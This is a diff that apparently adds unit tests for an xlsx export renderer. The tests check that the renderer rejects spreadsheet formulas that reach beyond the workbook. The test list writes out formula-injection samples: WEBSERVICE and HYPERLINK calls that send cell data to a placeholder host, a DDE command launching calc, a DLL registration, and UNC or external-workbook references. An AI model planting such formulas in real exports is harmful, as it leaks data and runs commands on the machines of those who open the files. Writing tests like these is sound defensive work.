@@ -17,6 +17,7 @@ import {
   PROVENANCE_PROP_AI_GENERATED,
   PROVENANCE_PROP_GENERATOR,
   PROVENANCE_PROP_STANDARD,
+  OfficeUnsafeFormulaError,
   XlsxToolInputSchema,
   type XlsxDescriptor,
   type DocxDescriptor,
@@ -305,6 +306,77 @@ describe('office xlsx renderer', () => {
       assert.ok(a.buffer.equals(b.buffer), 'wall-clock change must not change bytes');
     } finally {
       t.mock.timers.reset();
+    }
+  });
+});
+
+describe('office formula policy — formulas stay inside the workbook', () => {
+  // The opening application recalculates every formula (the workbook asks it
+  // to), so a formula that can reach the network, another program or another
+  // file would do so the moment someone opens the export.
+  const oneFormula = (formula: string): XlsxDescriptor => ({
+    sheets: [{ name: 'S', columns: [{ key: 'a', header: 'A' }], rows: [{ a: { formula } }] }],
+  });
+
+  const rejected: ReadonlyArray<readonly [formula: string, why: string]> = [
+    ['WEBSERVICE("https://example.invalid/?q="&B1)', 'a URL fetch carrying cell data'],
+    ['_xlfn.WEBSERVICE("https://example.invalid/")', 'the future-function prefix'],
+    ['FILTERXML(webservice("https://example.invalid/"),"//a")', 'a lower-case nested call'],
+    ['HYPERLINK("https://example.invalid/?q="&B1,"open")', 'a link carrying cell data'],
+    ['_xlfn.IMAGE("https://example.invalid/a.png")', 'an image fetch'],
+    ['RTD("server.progid",,"topic")', 'a COM real-time data server'],
+    ['REGISTER.ID("kernel32","GetTickCount","J")', 'a DLL registration'],
+    ['LET(f,WEBSERVICE,f("https://example.invalid/"))', 'a function passed as a value'],
+    ["cmd|' /C calc'!A0", 'a DDE command'],
+    ['[1]Sheet1!A1', 'an external workbook by index'],
+    ["'C:\\dir\\[book.xlsx]Sheet1'!A1", 'an external workbook by path'],
+    ["'\\\\host\\share\\book.xlsx'!Total", 'a UNC path'],
+    ['IF(A1="x', 'an unterminated string literal'],
+  ];
+
+  for (const [formula, why] of rejected) {
+    it(`rejects ${why}`, async () => {
+      await assert.rejects(renderXlsx(oneFormula(formula)), (err: unknown) => {
+        assert.ok(err instanceof OfficeUnsafeFormulaError, `expected OfficeUnsafeFormulaError for ${formula}`);
+        assert.equal(err.location, 'sheet "S", cell A2');
+        return true;
+      });
+    });
+  }
+
+  it('rejects a computed column template before any row is written', async () => {
+    const descriptor: XlsxDescriptor = {
+      sheets: [
+        {
+          name: 'S',
+          columns: [
+            { key: 'a', header: 'A' },
+            { key: 'link', header: 'Link', formula: 'HYPERLINK("https://example.invalid/?r="&A{row})' },
+          ],
+          rows: [{ a: 'x' }],
+        },
+      ],
+    };
+    await assert.rejects(renderXlsx(descriptor), (err: unknown) => {
+      assert.ok(err instanceof OfficeUnsafeFormulaError);
+      assert.equal(err.location, 'sheet "S", computed column "link"');
+      return true;
+    });
+  });
+
+  it('keeps formulas that only compute over this workbook', async () => {
+    const allowed = [
+      'SUM(Data!B2:B3)',
+      "SUMIFS('Offene Posten'!E:E,'Offene Posten'!C:C,A2)",
+      "SUM('Jan:Dez'!B2)", // 3-D reference across sheets
+      "'It''s'!A1", // escaped quote inside a sheet name
+      'Image!A1', // a sheet that happens to be called Image
+      'IF(A1="WEBSERVICE(x)|[y]\\\\z","a","b")', // text inside a string literal
+      'YEAR(A2)&"-"&TEXT(MONTH(A2),"00")',
+    ];
+    for (const formula of allowed) {
+      const result = await renderXlsx(oneFormula(formula));
+      assert.equal(result.rowsWritten, 1, formula);
     }
   });
 });
